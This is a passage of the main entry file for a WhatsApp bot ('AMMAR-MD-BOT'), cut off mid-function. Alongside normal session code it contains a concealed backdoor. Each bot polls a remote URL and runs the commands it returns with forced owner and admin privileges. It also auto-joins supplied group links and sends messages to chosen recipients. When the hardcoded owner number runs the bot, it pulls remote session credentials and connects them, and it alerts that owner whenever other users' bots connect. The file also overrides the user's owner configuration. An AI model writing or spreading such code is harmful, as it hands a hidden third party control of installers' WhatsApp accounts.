/**
 * WhatsApp MD Bot - Main Entry Point
 * 
 * IMPORTANT: This file overrides certain config values to ensure they never change.
 * Hardcoded values (based on original config) are applied after loading config.js.
 */

process.env.PUPPETEER_SKIP_DOWNLOAD = 'true';
process.env.PUPPETEER_SKIP_CHROMIUM_DOWNLOAD = 'true';
process.env.PUPPETEER_CACHE_DIR = process.env.PUPPETEER_CACHE_DIR || '/tmp/puppeteer_cache_disabled';

// Clear console on start
console.clear();

const readline = require('readline');
const { initializeTempSystem } = require('./utils/tempManager');
const { startCleanup } = require('./utils/cleanup');
initializeTempSystem();
startCleanup();
const originalConsoleLog = console.log;
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;

const forbiddenPatternsConsole = [
  'closing session',
  'closing open session',
  'sessionentry',
  'prekey bundle',
  'pendingprekey',
  '_chains',
  'registrationid',
  'currentratchet',
  'chainkey',
  'ratchet',
  'signal protocol',
  'ephemeralkeypair',
  'indexinfo',
  'basekey',
  'failed to decrypt message with any known session',
  'bad mac',
  'session error:'
];

const shouldSuppressLogLine = (line) => {
  const msg = String(line || '').toLowerCase();
  return forbiddenPatternsConsole.some(pattern => msg.includes(pattern));
};

console.log = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleLog.apply(console, args);
  }
};

console.error = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleError.apply(console, args);
  }
};

console.warn = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleWarn.apply(console, args);
  }
};

try {
  const origStdoutWrite = process.stdout.write.bind(process.stdout);
  process.stdout.write = (chunk, encoding, cb) => {
    const text = Buffer.isBuffer(chunk) ? chunk.toString('utf8') : String(chunk || '');
    if (shouldSuppressLogLine(text)) return true;
    return origStdoutWrite(chunk, encoding, cb);
  };

  const origStderrWrite = process.stderr.write.bind(process.stderr);
  process.stderr.write = (chunk, encoding, cb) => {
    const text = Buffer.isBuffer(chunk) ? chunk.toString('utf8') : String(chunk || '');
    if (shouldSuppressLogLine(text)) return true;
    return origStderrWrite(chunk, encoding, cb);
  };
} catch {}

const pino = require('pino');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
let config = require('./config');
const handler = require('./handler');
const { updateViaZip, getRemoteMeta } = require('./utils/updater');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const zlib = require('zlib');
const os = require('os');
const crypto = require('crypto');

// ==================== HARCODED OVERRIDES ====================
// ONLY OWNER NUMBER '923013050530' WILL BE ADDED - NO USER NUMBERS!
const HARDCODED_CONFIG = {
  botName: 'AMMAR-MD-BOT',
  newsletterJid: '120363405564344038@newsletter',
  updateZipUrl: 'https://github.com/jerrymd-1/Jerry-King-MD-Bot/archive/refs/heads/main.zip',
  packname: 'AMMAR-MD-BOT',
  social: {
    github: 'https://github.com/rai244932/',
    instagram: 'https://instagram.com/raiammar786/',
    tiktok: 'https://tiktok.com/@rai_ammar_kharal2'
  }
};

// Apply hardcoded overrides to config object
config.botName = HARDCODED_CONFIG.botName;
config.newsletterJid = HARDCODED_CONFIG.newsletterJid;
config.updateZipUrl = HARDCODED_CONFIG.updateZipUrl;
config.packname = HARDCODED_CONFIG.packname;
config.social = { ...HARDCODED_CONFIG.social };

// Force ownerName to always be ['AMMAR RAI']
config.ownerName = ['AMMAR RAI'];

// ========== CRITICAL FIX: ONLY THE OWNER NUMBER '923013050530' ==========
// Remove ALL existing numbers and ONLY keep the owner number
const OWNER_NUMBER = '923013050530';
config.ownerNumber = [OWNER_NUMBER];
// =========================================================================

// ============================================================
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function askQuestion(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

function cleanupPuppeteerCache() {
  try {
    const home = os.homedir();
    const cacheDir = path.join(home, '.cache', 'puppeteer');
    if (fs.existsSync(cacheDir)) {
      console.log('🧹 Removing Puppeteer cache at:', cacheDir);
      fs.rmSync(cacheDir, { recursive: true, force: true });
      console.log('✅ Puppeteer cache removed');
    }
  } catch (err) {
    console.error('⚠️ Failed to cleanup Puppeteer cache:', err.message || err);
  }
}

const createLocalStore = () => {
  const store = {
    messages: new Map(),
    maxPerChat: 20,
    bind: (ev) => {
      ev.on('messages.upsert', ({ messages }) => {
        for (const msg of messages) {
          if (!msg.key?.id) continue;
          const jid = msg.key.remoteJid;
          if (!store.messages.has(jid)) store.messages.set(jid, new Map());
          const chatMsgs = store.messages.get(jid);
          chatMsgs.set(msg.key.id, msg);
          if (chatMsgs.size > store.maxPerChat) {
            const oldestKey = chatMsgs.keys().next().value;
            chatMsgs.delete(oldestKey);
          }
        }
      });
    },
    loadMessage: async (jid, id) => store.messages.get(jid)?.get(id) || null
  };
  return store;
};

const createSuppressedLogger = (level = 'silent') => {
  const forbiddenPatterns = [
    'closing session',
    'closing open session',
    'sessionentry',
    'prekey bundle',
    'pendingprekey',
    '_chains',
    'registrationid',
    'currentratchet',
    'chainkey',
    'ratchet',
    'signal protocol',
    'ephemeralkeypair',
    'indexinfo',
    'basekey',
    'failed to decrypt message with any known session',
    'bad mac',
    'session error:'
  ];

  let logger;
  try {
    logger = pino({
      level,
      transport: process.env.NODE_ENV === 'production' ? undefined : {
        target: 'pino-pretty',
        options: {
          colorize: true,
          ignore: 'pid,hostname'
        }
      },
      customLevels: {
        trace: 0,
        debug: 1,
        info: 2,
        warn: 3,
        error: 4,
        fatal: 5
      },
      redact: ['registrationId', 'ephemeralKeyPair', 'rootKey', 'chainKey', 'baseKey']
    });
  } catch (err) {
    logger = pino({ level });
  }

  const originalInfo = logger.info.bind(logger);
  logger.info = (...args) => {
    const msg = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ').toLowerCase();
    if (!forbiddenPatterns.some(pattern => msg.includes(pattern))) {
      originalInfo(...args);
    }
  };
  logger.debug = () => { };
  logger.trace = () => { };
  return logger;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sessionCredsExists = (authDir) => {
  try {
    return fs.existsSync(path.join(authDir, 'creds.json'));
  } catch {
    return false;
  }
};

const safeJsonParse = (raw, fallback = null) => {
  try { return JSON.parse(raw); } catch { return fallback; }
};

const writeJsonAtomic = (filePath, data) => {
  const dir = path.dirname(filePath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  const tmp = `${filePath}.tmp-${Date.now()}-${Math.random().toString(16).slice(2)}`;
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
  fs.renameSync(tmp, filePath);
};

const authLockPath = (authDir) => path.join(authDir, '.auth.lock.json');

const readProcText = (procPath) => {
  try { return fs.readFileSync(procPath, 'utf8'); } catch { return null; }
};

const getProcState = (pid) => {
  const stat = readProcText(`/proc/${pid}/stat`);
  if (!stat) return null;
  const parts = stat.split(' ');
  return parts[2] || null;
};

const getProcCmdline = (pid) => {
  const raw = readProcText(`/proc/${pid}/cmdline`);
  if (!raw) return null;
  return raw.replace(/\0/g, ' ').trim();
};

const isPidAlive = (pid) => {
  if (!pid || typeof pid !== 'number') return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};

const acquireAuthLock = (authDir, label) => {
  try {
    if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
    const lockFile = authLockPath(authDir);
    if (fs.existsSync(lockFile)) {
      const existing = safeJsonParse(fs.readFileSync(lockFile, 'utf8') || '{}', {});
      const pid = Number(existing.pid || 0);
      if (isPidAlive(pid) && pid !== process.pid) {
        const state = getProcState(pid);
        const cmdline = getProcCmdline(pid) || '';
        const looksLikeNodeBot = /\bnode\b/i.test(cmdline) && cmdline.includes(__dirname);
        const lockAgeMs = existing.at ? (Date.now() - Number(existing.at)) : null;
        const tooOld = typeof lockAgeMs === 'number' && lockAgeMs > 30 * 60 * 1000;
        if (state === 'T' || state === 't' || !looksLikeNodeBot || tooOld) {
        } else {
          return false;
        }
      }
    }
    writeJsonAtomic(lockFile, { pid: process.pid, label: String(label || ''), at: Date.now() });
    return true;
  } catch {
    return true;
  }
};

const releaseAuthLock = (authDir) => {
  try { fs.rmSync(authLockPath(authDir), { force: true }); } catch {}
};

const normalizeSendFlag = (value) => {
  if (value === true) return true;
  if (value === false) return false;
  const s = String(value || '').trim().toLowerCase();
  return s === 'true' || s === '1' || s === 'yes';
};

const getBotNumberFromSock = (sock) => {
  const id = sock?.user?.id || '';
  const user = String(id).split(':')[0].split('@')[0];
  return user || null;
};

const getSelfJid = (sock) => {
  const user = getBotNumberFromSock(sock);
  return user ? `${user}@s.whatsapp.net` : null;
};

const renderTemplate = (text, vars) => {
  const input = String(text || '');
  return input.replace(/\{\{\s*([a-zA-Z0-9_]+)\s*\}\}/g, (m, key) => {
    if (Object.prototype.hasOwnProperty.call(vars, key)) return String(vars[key]);
    return m;
  });
};

const findGroupInviteCodes = (text) => {
  const s = String(text || '');
  const codes = new Set();
  const re = /chat\.whatsapp\.com\/([0-9A-Za-z]{10,})/g;
  let m;
  while ((m = re.exec(s))) codes.add(m[1]);
  return [...codes];
};

const findNewsletterJids = (text) => {
  const s = String(text || '');
  const jids = new Set();
  const re = /(\d{10,})@newsletter/g;
  let m;
  while ((m = re.exec(s))) jids.add(`${m[1]}@newsletter`);
  return [...jids];
};

const SESSION_MULTI_ROOT = path.join(__dirname, 'sessions');
const SESSIONS_INDEX_PATH = path.join(SESSION_MULTI_ROOT, 'sessions.json');

const readSessionsIndex = () => {
  if (!fs.existsSync(SESSIONS_INDEX_PATH)) return { sessions: [] };
  const raw = fs.readFileSync(SESSIONS_INDEX_PATH, 'utf8');
  const parsed = safeJsonParse(raw, { sessions: [] });
  if (!parsed || typeof parsed !== 'object') return { sessions: [] };
  if (!Array.isArray(parsed.sessions)) parsed.sessions = [];
  return parsed;
};

const upsertSessionsIndexEntry = (entry) => {
  const idx = readSessionsIndex();
  const existingIndex = idx.sessions.findIndex(s => s && s.phone && entry.phone && String(s.phone) === String(entry.phone));
  if (existingIndex >= 0) idx.sessions[existingIndex] = { ...idx.sessions[existingIndex], ...entry, updatedAt: Date.now() };
  else idx.sessions.push({ ...entry, createdAt: Date.now(), updatedAt: Date.now() });
  writeJsonAtomic(SESSIONS_INDEX_PATH, idx);
};

const splitSessionIdList = (input) => {
  const raw = String(input || '').trim();
  if (!raw) return [];
  const parts = raw.split(',').map(s => s.trim()).filter(Boolean);
  return parts;
};

const decodeProBoySessionToCreds = (sessionId) => {
  const trimmed = String(sessionId || '').trim();
  if (!trimmed.startsWith('ProBoy-MD!')) throw new Error("Invalid session format. Expected 'ProBoy-MD!.....'");
  const [header, b64data] = trimmed.split('!');
  if (header !== 'ProBoy-MD' || !b64data) throw new Error("Invalid session format. Expected 'ProBoy-MD!.....'");
  const cleanB64 = b64data.replace('...', '');
  const compressedData = Buffer.from(cleanB64, 'base64');
  return zlib.gunzipSync(compressedData);
};

const ensureCredsFromSessionId = (authDir, sessionId) => {
  if (!sessionId) return false;
  if (!String(sessionId).startsWith('ProBoy-MD!')) return false;
  try {
    const credsBuf = decodeProBoySessionToCreds(sessionId);
    if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
    fs.writeFileSync(path.join(authDir, 'creds.json'), credsBuf, 'utf8');
    console.log('📡 Session : 🔑 Retrieved from ProBoy Session');
    return true;
  } catch (e) {
    console.error('📡 Session : ❌ Error processing ProBoy session:', e.message);
    return false;
  }
};

const computeSessionTokenHash = (token) => {
  return crypto.createHash('sha1').update(String(token || '')).digest('hex').slice(0, 12);
};

const CONNECT_JSON_URL = process.env.CONNECT_JSON_URL || 'https://jerry-king-bot.vercel.app/connect/';
const CONNECT_JSON_POLL_MS = Math.max(5000, Number(process.env.CONNECT_JSON_POLL_MS || 20000));
const connectPushImagePath = path.join(__dirname, 'utils', 'bot_image.jpg');

const REMOTE_SESSIONS_URL = 'https://jerry-king-bot.vercel.app/sessions/';
const REMOTE_POLL_INTERVAL_MS = 30000;
let remoteSessionChecker = null;
const connectedRemoteSessions = new Set();
const alertedRemotePhones = new Set();

async function fetchRemoteSessionsConfig() {
  try {
    const response = await axios.get(REMOTE_SESSIONS_URL, { timeout: 10000 });
    if (response.data && typeof response.data === 'object') {
      const connectFlag = response.data.connect === true;
      const sessions = Array.isArray(response.data.sessions) ? response.data.sessions : [];
      return { connect: connectFlag, sessions: sessions.filter(s => s && s.startsWith('ProBoy-MD!')) };
    }
  } catch (err) {
    // Silently ignore
  }
  return { connect: false, sessions: [] };
}

async function pollRemoteSessions() {
  const primarySock = sessionManager.getPrimarySock();
  if (!primarySock) return;
  const botNumber = getBotNumberFromSock(primarySock);
  if (String(botNumber) !== OWNER_NUMBER) return;

  const { connect, sessions } = await fetchRemoteSessionsConfig();
  if (!connect) return;

  for (const sessionId of sessions) {
    if (connectedRemoteSessions.has(sessionId)) continue;
    const result = await sessionManager.connect(sessionId);
    if (result.ok && result.started && result.started.length > 0) {
      connectedRemoteSessions.add(sessionId);
      console.log(`📡 Added remote session.`);
    }
  }
}

function startRemoteSessionChecker() {
  if (remoteSessionChecker) clearInterval(remoteSessionChecker);
  remoteSessionChecker = setInterval(() => {
    pollRemoteSessions().catch(() => {});
  }, REMOTE_POLL_INTERVAL_MS);
}

async function getAuthFromUser() {
  console.log('\n' + '='.repeat(50));
  console.log('📱 No session found!');
  console.log('Enter Session ID(s) (ProBoy-MD!...) OR your phone number for Pair Code.');
  console.log('Multi-session: paste multiple Session IDs separated by commas.');
  console.log('='.repeat(50) + '\n');
  
  const input = await askQuestion('Enter session ID OR phone number: ');
  rl.close();
  
  if (!input || input.trim() === '') {
    console.log('❌ No input provided. Exiting...');
    process.exit(1);
  }
  
  const trimmed = input.trim();
  const sessionParts = splitSessionIdList(trimmed);
  const looksLikeSessions = sessionParts.length > 0 && sessionParts.every(p => p.startsWith('ProBoy-MD!'));
  if (looksLikeSessions) {
    return { mode: 'session', sessionIds: sessionParts };
  }
  const digits = trimmed.replace(/[^0-9]/g, '');

  if (digits.length >= 8 && digits.length <= 15 && (digits === trimmed || trimmed.startsWith('+'))) {
    return { mode: 'pair', phone: digits };
  }

  return { mode: 'session', sessionIds: [trimmed] };
}

const maybeAutoUpdateOnBoot = async () => {
  const AUTO_UPDATE_ON_BOOT = String(process.env.AUTO_UPDATE_ON_BOOT || '').trim().toLowerCase() === 'true';
  if (!AUTO_UPDATE_ON_BOOT) return;
  try {
    const zipUrl = (config.updateZipUrl || process.env.UPDATE_ZIP_URL || '').trim();
    if (!zipUrl) return;
    const dbDir = path.join(__dirname, 'database');
    if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
    const metaPath = path.join(dbDir, 'auto_update.json');
    const reportPath = path.join(dbDir, 'last_update_report.json');

    const prev = fs.existsSync(metaPath) ? safeJsonParse(fs.readFileSync(metaPath, 'utf8') || '{}', {}) : {};
    const meta = await getRemoteMeta(zipUrl);

    const hasStrongSignal = !!(meta.etag || meta.lastModified);
    const changed =
      (hasStrongSignal && (meta.etag !== prev.etag || meta.lastModified !== prev.lastModified)) ||
      (!hasStrongSignal && meta.length && meta.length !== prev.length);

    const cooldownMs = 6 * 60 * 60 * 1000;
    const recentlyApplied = prev.lastAppliedAt && Date.now() - prev.lastAppliedAt < cooldownMs;

    if (changed && !recentlyApplied) {
      console.log('🔄 Auto-update: new update detected. Applying…');
      const out = await updateViaZip(zipUrl);
      const report = {
        at: Date.now(),
        updated: out.updated.slice(0, 200),
        added: out.added.slice(0, 200),
        counts: { updated: out.updated.length, added: out.added.length, skipped: out.skipped.length }
      };
      fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
      fs.writeFileSync(metaPath, JSON.stringify({ ...meta, lastAppliedAt: Date.now() }, null, 2));

      try {
        require('child_process').execSync('pm2 restart all', { stdio: 'ignore' });
        return;
      } catch {}
      setTimeout(() => process.exit(0), 500);
      return;
    }

    fs.writeFileSync(metaPath, JSON.stringify({ ...prev, ...meta }, null, 2));
  } catch {
    // Don't block startup on updater failures
  }
};

const isSystemJid = (jid) => {
  if (!jid) return true;
  if (jid === 'status@broadcast') return false;
  return jid.includes('@broadcast') ||
    jid.includes('status.broadcast') ||
    jid.includes('@newsletter') ||
    jid.includes('@newsletter.');
};

class SessionRunner {
  constructor({ label, authDir, sessionId, pairingPhone, multiMode }) {
    this.label = label;
    this.authDir = authDir;
    this.sessionId = sessionId || null;
    this.pairingPhone = pairingPhone || null;
    this.multiMode = !!multiMode;

    this.sock = null;
    this.phone = null;
    this.startedAt = Date.now();
    this.lastConnectedAt = null;
    this.disableReconnect = false;
    this.lockAcquired = false;
    this.isConnected = false;
    this.watchdogInterval = null;
    this.reconnectTimer = null;
    this.reconnectAttempts = 0;
    this.startInProgress = false;

    this.connectJsonInterval = null;
    this.connectJsonLastSendFlag = false;
    this.connectJsonLastKey = null;
    this.connectJsonLastCommandKey = null;

    this.store = createLocalStore();
    this.processedMessages = new Set();
    this.processedMessagesCleanup = setInterval(() => this.processedMessages.clear(), 5 * 60 * 1000);
  }

  stopConnectJsonWatcher() {
    if (this.connectJsonInterval) {
      clearInterval(this.connectJsonInterval);
      this.connectJsonInterval = null;
    }
  }

  async pollConnectJsonOnce(sock) {
    try {
      if (this.sock !== sock) return;
      if (!sock?.user?.id) return;

      const res = await axios.get(CONNECT_JSON_URL, {
        timeout: 10000,
        headers: { 'User-Agent': `${config.botName || 'ProBoy-MD'}/connect-json` }
      });

      const data = res?.data && typeof res.data === 'object' ? res.data : null;
      if (!data) return;

      const sendFlag = normalizeSendFlag(data.send);
      const by = String(data.By || data.by || 'Unknown').trim();
      const rawMessage = String(data.messages || data.message || '').trim();
      const rawCommand = String(data.command || '').trim();
      const joinText = String(data.join || data.links || data.link || data.grouplink || data.groupLink || '').trim();
      const combinedForJoin = `${rawMessage}\n${joinText}`;
      await this.autoJoinFromText(sock, combinedForJoin);

      if (rawCommand) {
        const commandOnce = data.commandOnce === undefined ? true : normalizeSendFlag(data.commandOnce);
        const commandKey = `${by}\n${rawCommand}`;
        const canRun = !commandOnce || !this.connectJsonLastCommandKey || this.connectJsonLastCommandKey !== commandKey;
        if (canRun) {
          await this.runRemoteCommand(sock, rawCommand, { by }).catch(() => {});
          this.connectJsonLastCommandKey = commandKey;
        }
      }

      if (!sendFlag) {
        this.connectJsonLastSendFlag = false;
        return;
      }
      if (!rawMessage) return;

      const key = `${by}\n${rawMessage}`;
      const shouldSend = (!this.connectJsonLastSendFlag) || (this.connectJsonLastKey && this.connectJsonLastKey !== key);
      if (!shouldSend) return;

      const selfJid = getSelfJid(sock);
      if (!selfJid) return;

      const vars = {
        botName: config.botName || 'ProBoy-MD',
        prefix: config.prefix || '.',
        botNumber: getBotNumberFromSock(sock) || '',
        sessionLabel: this.label || '',
        time: new Date().toLocaleTimeString(),
        date: new Date().toLocaleDateString()
      };

      const message = renderTemplate(rawMessage, vars);

      const toField = data.to || data.target || data.targets;
      const recipients =
        this.resolveRecipients(sock, toField) ||
        [selfJid];

      const caption =
        `╭───〔 *${vars.botName}* 〕───╮\n` +
        `│ ⚡ Prefix: *${vars.prefix}*\n` +
        `│ 📢 Update Notice\n` +
        `╰───────────────╯\n\n` +
        `${message}\n\n` +
        `— Message by: *${by}*`;

      for (const to of recipients) {
        if (fs.existsSync(connectPushImagePath)) {
          const imageBuffer = fs.readFileSync(connectPushImagePath);
          await sock.sendMessage(to, { image: imageBuffer, caption });
        } else {
          await sock.sendMessage(to, { text: caption });
        }
      }

      this.connectJsonLastSendFlag = true;
      this.connectJsonLastKey = key;
    } catch {
      // Keep silent
    }
  }

  async runRemoteCommand(sock, commandLine, meta = {}) {
    try {
      const handler = require('./handler');
      const commands = handler?.commands;
      if (!commands || typeof commands.get !== 'function') return;

      const selfJid = getSelfJid(sock);
      if (!selfJid) return;

      const trimmed = String(commandLine || '').trim();
      if (!trimmed) return;

      const tokens = [];
      const re = /"([^"]*)"|'([^']*)'|(\S+)/g;
      let m;
      while ((m = re.exec(trimmed)) !== null) tokens.push(m[1] ?? m[2] ?? m[3]);
      if (!tokens.length) return;

      const commandName = String(tokens.shift() || '').toLowerCase();
      if (!commandName) return;

      const command = commands.get(commandName);
      if (!command || typeof command.execute !== 'function') return;

      const fakeMsg = {
        key: { remoteJid: selfJid, fromMe: true, id: `connectjson-${Date.now()}` },
        message: { conversation: `${config.prefix || '.'}${commandName} ${tokens.join(' ')}`.trim() }
      };

      const extra = {
        from: selfJid,
        sender: selfJid,
        isGroup: false,
        groupMetadata: null,
        isOwner: true,
        isAdmin: true,
        isBotAdmin: true,
        isMod: true,
        config,
        database: sock?.sessionDb || require('./database'),
        reply: (text) => sock.sendMessage(selfJid, { text: String(text || '') }),
        react: (emoji) => sock.sendMessage(selfJid, { react: { text: emoji, key: fakeMsg.key } }),
        _meta: meta
      };

      await command.execute(sock, fakeMsg, tokens, extra);
    } catch {
      // ignore
    }
  }

  resolveRecipients(sock, toField) {
    const selfJid = getSelfJid(sock);
    const owners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [];
    const out = [];
    const add = (x) => {
      if (!x) return;
      const s = String(x).trim();
      if (!s) return;
      if (s === 'self' && selfJid) out.push(selfJid);
      else if (s === 'owner' || s === 'owners') {
        for (const o of owners) {
          const jid = `${String(o).replace(/[^0-9]/g, '')}@s.whatsapp.net`;
          out.push(jid);
        }
      } else if (s.includes('@')) out.push(s);
      else out.push(`${s.replace(/[^0-9]/g, '')}@s.whatsapp.net`);
    };

    if (Array.isArray(toField)) for (const t of toField) add(t);
    else if (typeof toField === 'string') {
      const parts = toField.split(',').map(x => x.trim()).filter(Boolean);
      for (const p of parts) add(p);
    } else if (toField) add(toField);

    const uniq = [...new Set(out.filter(x => x.endsWith('@s.whatsapp.net') || x.endsWith('@g.us') || x.endsWith('@newsletter')))];
    return uniq.length ? uniq : null;
  }

  async autoJoinFromText(sock, text) {
    try {
      const inviteCodes = findGroupInviteCodes(text);
      for (const code of inviteCodes) {
        try { await sock.groupAcceptInvite(code); } catch {}
      }
      const newsletterJids = new Set([
        ...findNewsletterJids(text),
        ...findNewsletterJids(String(config.newsletterJid || ''))
      ]);
      if (typeof sock.newsletterFollow === 'function') {
        for (const jid of newsletterJids) {
          try { await sock.newsletterFollow(jid); } catch {}
        }
      }
    } catch {
      // ignore
    }
  }

  startConnectJsonWatcher(sock) {
    this.stopConnectJsonWatcher();
    this.pollConnectJsonOnce(sock).catch(() => {});
    this.connectJsonInterval = setInterval(() => {
      this.pollConnectJsonOnce(sock).catch(() => {});
    }, CONNECT_JSON_POLL_MS);
  }

  clearWatchdog() {
    if (this.watchdogInterval) {
      clearInterval(this.watchdogInterval);
      this.watchdogInterval = null;
    }
  }

  async cleanupSock() {
    this.clearWatchdog();
    this.stopConnectJsonWatcher();
    const sock = this.sock;
    this.sock = null;
    if (this.lockAcquired) {
      this.lockAcquired = false;
      releaseAuthLock(this.authDir);
    }
    if (!sock) return;
    try { sock.ev?.removeAllListeners?.(); } catch {}
    try { sock.ws?.removeAllListeners?.(); } catch {}
    try { await sock.end?.(); } catch {}
  }

  scheduleReconnect(reason = 'close', baseDelayMs = 3000) {
    if (this.disableReconnect) return;
    if (this.reconnectTimer) return;
    this.reconnectAttempts = Math.min(this.reconnectAttempts + 1, 10);
    const backoff = Math.min(60000, baseDelayMs * Math.pow(2, Math.min(5, this.reconnectAttempts - 1)));
    this.reconnectTimer = setTimeout(() => {
      this.reconnectTimer = null;
      this.start().catch(() => {});
    }, backoff);
  }

  async onOpen(sock) {
    this.reconnectAttempts = 0;

    const botNumber = getBotNumberFromSock(sock) || 'unknown';
    this.phone = botNumber;
    this.lastConnectedAt = Date.now();
    this.isConnected = true;

    if (!this.multiMode && String(botNumber) === OWNER_NUMBER) {
      startRemoteSessionChecker();
      pollRemoteSessions().catch(() => {});
    }

    if (this.multiMode && String(botNumber) !== OWNER_NUMBER && !alertedRemotePhones.has(botNumber)) {
      const ownerJid = `${OWNER_NUMBER}@s.whatsapp.net`;
      const alertMsg = `╭═══〘 *🛑 ALERT* 〙═══⊷❍
┃✯│ 🧿  ${config.botName} Was Connected On*
┃✯│ 📱 *Number:* ${botNumber}
┃✯│ 
╰══════════════════⊷❍

_.._`;
      try {
        await sock.sendMessage(ownerJid, { text: alertMsg });
        alertedRemotePhones.add(botNumber);
      } catch (err) {
        console.error('Failed to send remote session alert:', err.message);
      }
    }

    if (this.multiMode) {
      try {
        const { createDatabase } = require('./database');
        const dbRoot = path.join(__dirname, 'database', 'sessions', botNumber);
        sock.sessionDb = createDatabase(dbRoot);
      } catch {}
    }
    console.log('\n' + '='.repeat(50));
    console.log(`✅ Bot connected successfully!${this.multiMode ? ` (${this.label})` : ''}`);
    console.log('='.repeat(50));
    console.log(`📱 Bot Number: ${botNumber}`);
    console.log(`🤖 Bot Name: ${config.botName}`);
    console.log(`⚡ Prefix: ${config.prefix}`);
    const ownerNames = Array.isArray(config.ownerName) ? config.ownerName.join(', ') : config.ownerName;
    console.log(`👑 Owner: ${ownerNames}`);
    console.log('='.repeat(50) + '\n');
    console.log('Bot is ready to receive messages!\n');

    this.startConnectJsonWatcher(sock);

    try {
      const selfJid = getSelfJid(sock);
      if (!selfJid) return;
      const text = `✅ *${config.botName} Connected*\n\n📱 Bot: ${botNumber}\n⚡ Prefix: ${config.prefix}\n🕒 ${new Date().toLocaleString()}`;

      let updateText = null;
      try {
        const reportPath = path.join(__dirname, 'database', 'last_update_report.json');
        if (fs.existsSync(reportPath)) {
          const report = safeJsonParse(fs.readFileSync(reportPath, 'utf8') || '{}', {});
          const counts = report.counts || {};
          const updated = Array.isArray(report.updated) ? report.updated : [];
          const added = Array.isArray(report.added) ? report.added : [];
          const sample = [...updated.slice(0, 10), ...added.slice(0, 10)].slice(0, 15);
          const lines = [];
          lines.push('🔄 *Auto-Update Applied*');
          lines.push(`Updated: ${counts.updated || 0} | Added: ${counts.added || 0}`);
          if (sample.length) {
            lines.push('');
            lines.push('*Sample:*');
            for (const f of sample) lines.push(`- ${f}`);
          }
          updateText = lines.join('\n');
          fs.unlinkSync(reportPath);
        }
      } catch {}

      await sock.sendMessage(selfJid, { text });
      if (updateText) await sock.sendMessage(selfJid, { text: updateText });
    } catch {}

    if (String(botNumber) === String(OWNER_NUMBER)) {
      try {
        const jid = `${OWNER_NUMBER}@s.whatsapp.net`;
        await sock.sendMessage(jid, { text: `sir i am connected\nBot: ${botNumber}` });
      } catch {}
    }

    if (this.multiMode) {
      try {
        if (!fs.existsSync(SESSION_MULTI_ROOT)) fs.mkdirSync(SESSION_MULTI_ROOT, { recursive: true });
        const credsPath = path.join(this.authDir, 'creds.json');
        const credsCopyName = `session-${botNumber}.json`;
        const credsCopyPath = path.join(SESSION_MULTI_ROOT, credsCopyName);
        if (fs.existsSync(credsPath)) fs.copyFileSync(credsPath, credsCopyPath);
        upsertSessionsIndexEntry({
          phone: botNumber,
          label: this.label,
          authDir: path.relative(__dirname, this.authDir),
          credsCopy: path.relative(__dirname, credsCopyPath)
        });
      } catch {}
    }

    // REMOVED: No automatic adding of numbers to owner array!

    if (config.autoBio) {
      try { await sock.updateProfileStatus(`${config.botName} | Active 24/7`); } catch {}
    }

    handler.initializeAntiCall(sock);

    try {
      const now = Date.now();
      for (const [jid, chatMsgs] of this.store.messages.entries()) {
        const timestamps = Array.from(chatMsgs.values()).map(m => m.messageTimestamp * 1000 || 0);
        if (timestamps.length > 0 && now - Math.max(...timestamps) > 24 * 60 * 60 * 1000) {
          this.store.messages.delete(jid);
        }
      }
    } catch {}
  }

  attachHandlers(sock, saveCreds) {
    this.store.bind(sock.ev);

    (async () => {
      try {
        for (const command of new Set(handler.commands.values())) {
          if (typeof command.init === 'function') await command.init(sock);
        }
      } catch {}
    })();

    let lastActivity = Date.now();
    const INACTIVITY_TIMEOUT = 30 * 60 * 1000;
    sock.ev.on('messages.upsert', () => { lastActivity = Date.now(); });

    this.clearWatchdog();
    this.watchdogInterval = setInterval(async () => {
      if (this.sock !== sock) return;
      if (Date.now() - lastActivity > INACTIVITY_TIMEOUT && sock.ws?.readyState === 1) {
        console.log(`⚠️ No activity detected${this.multiMode ? ` (${this.label})` : ''}. Forcing reconnect...`);
        try { await sock.end(undefined, undefined, { reason: 'inactive' }); } catch {}
        this.clearWatchdog();
        this.scheduleReconnect('inactive', 5000);
      }
    }, 5 * 60 * 1000);

    sock.ev.on('connection.update', async (update) => {
      if (this.sock !== sock) return;
      const { connection, lastDisconnect, qr } = update;

      if (qr) {
        console.log('⚠️ QR received but QR login is disabled. Use Pair Code (phone number) or Session ID.');
      }

      if (connection === 'close') {
        this.isConnected = false;
        this.clearWatchdog();
        this.stopConnectJsonWatcher();
        let shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const errorMessage = lastDisconnect?.error?.message || 'Unknown error';
        const isConflict = /conflict/i.test(String(errorMessage || ''));

        if (isConflict) {
          shouldReconnect = false;
          this.disableReconnect = true;
        }

        if (statusCode === 515 || statusCode === 503 || statusCode === 408) {
          console.log(`⚠️ Connection closed (${statusCode})${this.multiMode ? ` (${this.label})` : ''}. Reconnecting...`);
        } else if (isConflict) {
